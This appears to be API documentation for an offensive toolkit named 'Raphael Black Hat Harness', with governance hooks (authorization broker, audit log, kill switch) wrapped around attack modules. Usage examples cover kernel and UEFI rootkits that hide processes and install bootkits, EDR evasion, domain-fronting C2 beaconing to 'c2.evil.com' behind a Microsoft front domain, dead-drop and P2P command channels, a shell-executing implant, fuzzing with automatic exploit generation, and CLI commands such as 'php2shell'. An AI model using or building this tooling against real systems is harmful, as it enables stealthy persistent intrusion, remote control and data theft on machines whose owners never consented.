# API Documentation — Raphael Black Hat Harness v3.1

## Governance API

### UnifiedBroker

```python
from harness.governance import UnifiedBroker

broker = UnifiedBroker(audit_sink=audit_sink, kill_switch=kill_switch)
await broker.initialize()

result = await broker.authorize_action(
    action_type="scan",
    capability="nmap",
    method="nmap -sV",
    target="10.0.0.1",
    impact_estimate=2.0,
    metadata={"authorized_scopes": ("10.0.0.0/8",)}
)
# result.approved: bool
# result.reason: str
```

### AuditSink

```python
from harness.governance.audit_sink import AuditSink
from pathlib import Path

audit_sink = AuditSink(Path("logs/harness_audit.jsonl"))
await audit_sink.initialize()

await audit_sink.log_authorization(
    action_id="op_001",
    action_type="scan",
    capability="nmap",
    target="10.0.0.1",
    decision="approved",
    impact_estimate=2.0,
)

verification = await audit_sink.verify_chain()
# verification["valid"]: bool
```

### EmergencyKillSwitch

```python
from harness.governance import EmergencyKillSwitch

kill_switch = EmergencyKillSwitch()
event_id = await kill_switch.trigger(
    triggered_by="operator",
    reason="Emergency response",
    scope="global"
)
status = kill_switch.get_status()
```

## Black Hat Harness API

### BlackHatHarness

```python
from harness.black_hat_core import BlackHatHarness, BlackHatConfig

config = BlackHatConfig(
    target_host="10.0.0.1",
    target_port=443,
    stealth_level=StealthLevel.MAXIMUM,
)

harness = BlackHatHarness(
    config,
    broker=broker,
    audit_sink=audit_sink,
    kill_switch=kill_switch,
)

result = await harness.execute_operation({
    "type": "vuln_scan",
    "target": "10.0.0.1",
    "ports": "1-1000",
})
```

## Stealth API

### KernelRootkit

```python
from harness.stealth import KernelRootkit

rootkit = KernelRootkit(broker=broker, audit_sink=audit_sink)
await rootkit.load_driver("raphael.sys")
result = await rootkit.hide_process(1234)
# result.verified: VerifiedResult with before/after evidence
```

### UEFIRootkit

```python
from harness.stealth import UEFIRootkit

uefi = UEFIRootkit(broker=broker, audit_sink=audit_sink)
result = await uefi.install_bootkit("/path/to/payload.efi")
# result.verified: bool
```

### AdaptiveEvasionEngine

```python
from harness.stealth import AdaptiveEvasionEngine

evasion = AdaptiveEvasionEngine(broker=broker, audit_sink=audit_sink)
edr_type = evasion.detect_edr(system_info)
strategy = evasion.select_evasion_strategy("exploit", current_state)
```

## C2 API

### DomainFrontingC2

```python
from harness.c2 import DomainFrontingC2

c2 = DomainFrontingC2(broker=broker, audit_sink=audit_sink)
c2.configure(front_domain="www.microsoft.com", real_domain="c2.evil.com")
await c2.initialize()
response = await c2.send_beacon("implant_001", system_info)
```

### DeadDropResolverC2

```python
from harness.c2 import DeadDropResolverC2

dd = DeadDropResolverC2(broker=broker, audit_sink=audit_sink)
commands = await dd.fetch_commands("implant_001")
```

### P2PC2Network

```python
from harness.c2 import P2PC2Network

p2p = P2PC2Network(broker=broker, audit_sink=audit_sink)
p2p.configure(implant_id="implant_001")
port = await p2p.start_listener()
```

## Exploitation API

### FuzzingEngine

```python
from harness.exploitation import FuzzingEngine

fuzzer = FuzzingEngine(broker=broker, audit_sink=audit_sink)
fuzzer.set_target("/path/to/target_binary")
crashes = await fuzzer.fuzz(iterations=10000)
```

### ExploitGenerator

```python
from harness.exploitation import ExploitGenerator

generator = ExploitGenerator(crash)
analysis = generator.analyze()
exploit_code = generator.generate_exploit()
```

## Implant API

### CrossPlatformImplant

```python
from harness.implant import CrossPlatformImplant, Platform

implant = CrossPlatformImplant(broker=broker, audit_sink=audit_sink)
await implant.install()
status = implant.get_status()

task = ImplantTask(task_id="task_001", task_type="shell", parameters={"command": "whoami"})
result = await implant.execute_task(task)
```

## CLI

```
raphael exploit --target 10.0.0.1 --port 443 --objective ops/objective.json
raphael scan --target 10.0.0.0/24 --ports 1-1000
raphael exploit-live --host 10.0.0.1 --port 443
raphael php2shell --target-url http://target.com --lfi-param file
raphael research --query "CVE-2024-XXXX"
raphael ai-generate --target 10.0.0.1 --vuln-type buffer_overflow
```
